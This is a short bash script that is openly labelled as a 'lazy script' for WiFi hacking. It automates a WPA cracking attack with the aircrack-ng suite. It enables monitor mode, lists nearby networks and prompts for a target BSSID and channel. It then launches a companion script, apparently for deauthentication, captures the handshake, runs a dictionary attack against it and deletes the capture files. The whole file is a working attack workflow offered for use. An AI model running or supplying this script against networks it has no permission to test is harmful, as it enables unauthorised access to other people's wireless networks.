#!/bin/bash

clear
echo -e "$(tput setaf 1)
█    ██   ▄▄▄▄▄▄ ▀▄    ▄ ██   ▄█ █▄▄▄▄ ▄█▄    █▄▄▄▄ ██   ▄█▄    █  █▀ 
█    █ █ ▀   ▄▄▀   █  █  █ █  ██ █  ▄▀ █▀ ▀▄  █  ▄▀ █ █  █▀ ▀▄  █▄█   
█    █▄▄█ ▄▀▀   ▄▀  ▀█   █▄▄█ ██ █▀▀▌  █   ▀  █▀▀▌  █▄▄█ █   ▀  █▀▄   
███▄ █  █ ▀▀▀▀▀▀    █    █  █ ▐█ █  █  █▄  ▄▀ █  █  █  █ █▄  ▄▀ █  █  
    ▀   █         ▄▀        █  ▐   █   ▀███▀    █      █ ▀███▀    █   
       █                   █      ▀            ▀      █          ▀    
      ▀                   ▀                          ▀                "
echo -e "$(tput setaf 3) \n               A lazy script for aircrack-ng, wifi hacking.
        The script only Works if your wifi adapter has monitor mode."
echo -e "$(tput setaf 2)\n                           Developed by Sandesh"
echo -e "\n$(tput setaf 3)                        [ Press Enter To Continue ]"
read Enter
clear
echo -e "$(tput setaf 1)
█    ██   ▄▄▄▄▄▄ ▀▄    ▄ ██   ▄█ █▄▄▄▄ ▄█▄    █▄▄▄▄ ██   ▄█▄    █  █▀ 
█    █ █ ▀   ▄▄▀   █  █  █ █  ██ █  ▄▀ █▀ ▀▄  █  ▄▀ █ █  █▀ ▀▄  █▄█   
█    █▄▄█ ▄▀▀   ▄▀  ▀█   █▄▄█ ██ █▀▀▌  █   ▀  █▀▀▌  █▄▄█ █   ▀  █▀▄   
███▄ █  █ ▀▀▀▀▀▀    █    █  █ ▐█ █  █  █▄  ▄▀ █  █  █  █ █▄  ▄▀ █  █  
    ▀   █         ▄▀        █  ▐   █   ▀███▀    █      █ ▀███▀    █   
       █                   █      ▀            ▀      █          ▀    
      ▀                   ▀                          ▀                "
echo -e "$(tput setaf 2)Starting script:"
sleep 0.4
echo "~"
sleep 0.4
echo "~"
sleep 0.4
echo ~$(tput setaf 7)
sleep 0.4 	
clear
airmon-ng start wlan0
airodump-ng wlan0mon
read -p "Enter the BSSID > " bssid
read -p "Enter the Channel > " ch
x-terminal-emulator -e ./airplay.sh
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
aircrack-ng -w dictionary/dictionary.txt files-01.cap
set echo off
airmon-ng stop wlan0mon
rm files-01.cap files-01.csv files-01.kismet.csv files-01.kismet.netxml files-01.log.csv

